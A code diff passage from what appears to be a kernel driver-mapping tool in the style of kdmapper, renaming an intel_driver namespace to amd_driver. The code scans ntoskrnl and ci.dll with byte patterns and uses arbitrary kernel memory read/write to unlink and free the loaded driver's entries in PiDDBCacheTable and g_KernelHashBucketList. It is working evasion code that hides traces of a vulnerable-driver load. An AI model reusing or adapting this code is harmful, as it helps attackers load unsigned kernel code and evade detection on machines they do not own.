-PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
+PVOID amd_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
 	if (!Table)
 		return nullptr;
 
-	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
+	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
 
 	if (!kernel_RtlDeleteElementGenericTableAvl) {
 		kdmLog(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
@@ -930,7 +875,7 @@ PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PV
 }
 
 
-nt::PiDDBCacheEntry* intel_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
+nt::PiDDBCacheEntry* amd_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
 	
 	nt::PiDDBCacheEntry localentry{};
 	localentry.TimeDateStamp = timestamp;
@@ -941,7 +886,7 @@ nt::PiDDBCacheEntry* intel_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTabl
 	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
 }
 
-bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
+bool amd_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 
 #ifdef PDB_OFFSETS
 	auto PiDDBLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBLock");
@@ -958,16 +903,16 @@ bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDrive
 		return false;
 	}
 
-	PVOID PiDDBLock = (PVOID)(intel_driver::ntoskrnlAddr + PiDDBLockOffset);
-	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)(intel_driver::ntoskrnlAddr + PiDDBCacheTableOffset);
+	PVOID PiDDBLock = (PVOID)(amd_driver::ntoskrnlAddr + PiDDBLockOffset);
+	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)(amd_driver::ntoskrnlAddr + PiDDBCacheTableOffset);
 #else
-	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
-	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D
+	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
+	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D
 
 	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as possible
-		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
+		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
 		if (PiDDBLockPtr == NULL) {
-			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 48 8D 0D ? ? ? ? B2 01 66 FF 88 ? ? ? ? 90 E8 ? ? ? ? 4C 8B ? 24 update for build 26100.1000
+			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 48 8D 0D ? ? ? ? B2 01 66 FF 88 ? ? ? ? 90 E8 ? ? ? ? 4C 8B ? 24 update for build 26100.1000
 			if (PiDDBLockPtr == NULL) {
 				kdmLog(L"[-] Warning PiDDBLock not found" << std::endl);
 				return false;
@@ -987,7 +932,7 @@ bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDrive
 	}
 
 	if (PiDDBCacheTablePtr == NULL) {
-		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx"); // 48 8B F9 33 C0 48 8D 0D
+		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx"); // 48 8B F9 33 C0 48 8D 0D
 		if (PiDDBCacheTablePtr == NULL) {
 			kdmLog(L"[-] Warning PiDDBCacheTable not found" << std::endl);
 			return false;
@@ -1014,7 +959,7 @@ bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDrive
 
 	auto n = GetDriverNameW();
 
-	auto timestamp = portable_executable::GetNtHeaders((void*)intel_driver_resource::driver)->FileHeader.TimeDateStamp;
+	auto timestamp = portable_executable::GetNtHeaders((void*)amd_driver_resource::driver)->FileHeader.TimeDateStamp;
 
 	// search our entry in the table
 	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
@@ -1074,7 +1019,7 @@ bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDrive
 	return true;
 }
 
-uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
+uintptr_t amd_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
 	if (!dwAddress) {
 		kdmLog(L"[-] No module address to find pattern" << std::endl);
 		return 0;
@@ -1100,7 +1045,7 @@ uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen
 	return result;
 }
 
-uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
+uintptr_t amd_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
 	if (!modulePtr)
 		return 0;
 	BYTE headers[0x1000];
@@ -1119,13 +1064,13 @@ uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t m
 	return section - (uintptr_t)headers + modulePtr;
 }
 
-uintptr_t intel_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
+uintptr_t amd_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
 	ULONG sectionSize = 0;
 	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
 	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
 }
 
-bool intel_driver::ClearKernelHashBucketList() {
+bool amd_driver::ClearKernelHashBucketList() {
 	uint64_t ci = kdmUtils::GetKernelModuleAddress("ci.dll");
 	if (!ci) {
 		kdmLog(L"[-] Can't Find ci.dll module address" << std::endl);
@@ -1183,14 +1128,14 @@ bool intel_driver::ClearKernelHashBucketList() {
 	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
 		kdmLog(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
 		if (!ExReleaseResourceLite(g_HashCacheLock)) {
-			kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+			kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 		}
 		return false;
 	}
 	if (!entry) {
 		kdmLog(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
 		if (!ExReleaseResourceLite(g_HashCacheLock)) {
-			kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+			kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 		}
 		return true;
 	}
@@ -1205,7 +1150,7 @@ bool intel_driver::ClearKernelHashBucketList() {
 		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
 			kdmLog(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
 			if (!ExReleaseResourceLite(g_HashCacheLock)) {
-				kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+				kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 			}
 			return false;
 		}
@@ -1215,7 +1160,7 @@ bool intel_driver::ClearKernelHashBucketList() {
 			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
 				kdmLog(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
 				if (!ExReleaseResourceLite(g_HashCacheLock)) {
-					kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+					kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 				}
 				return false;
 			}
@@ -1224,7 +1169,7 @@ bool intel_driver::ClearKernelHashBucketList() {
 			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
 				kdmLog(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
 				if (!ExReleaseResourceLite(g_HashCacheLock)) {
-					kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+					kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 				}
 				return false;
 			}
@@ -1236,7 +1181,7 @@ bool intel_driver::ClearKernelHashBucketList() {
 				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
 					kdmLog(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
 					if (!ExReleaseResourceLite(g_HashCacheLock)) {
-						kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+						kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 					}
 					return false;
 				}
@@ -1244,7 +1189,7 @@ bool intel_driver::ClearKernelHashBucketList() {
 				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
 					kdmLog(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
 					if (!ExReleaseResourceLite(g_HashCacheLock)) {
-						kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+						kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 					}
 					return false;
 				}
@@ -1252,13 +1197,13 @@ bool intel_driver::ClearKernelHashBucketList() {
 				if (!FreePool((uintptr_t)entry)) {
 					kdmLog(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
 					if (!ExReleaseResourceLite(g_HashCacheLock)) {
-						kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+						kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 					}
 					return false;
 				}
 				kdmLog(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
 				if (!ExReleaseResourceLite(g_HashCacheLock)) {
-					kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+					kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 					return false;
 				}
 				return true;
@@ -1269,14 +1214,14 @@ bool intel_driver::ClearKernelHashBucketList() {
 		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
 			kdmLog(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
 			if (!ExReleaseResourceLite(g_HashCacheLock)) {
-				kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+				kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 			}
 			return false;
 		}
 	}
 
 	if (!ExReleaseResourceLite(g_HashCacheLock)) {
-		kdmLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+		kdmLog(L"[-] Failed to release g_HashCacheLock lock!" << std::endl);
 	}
 	return false;
 }
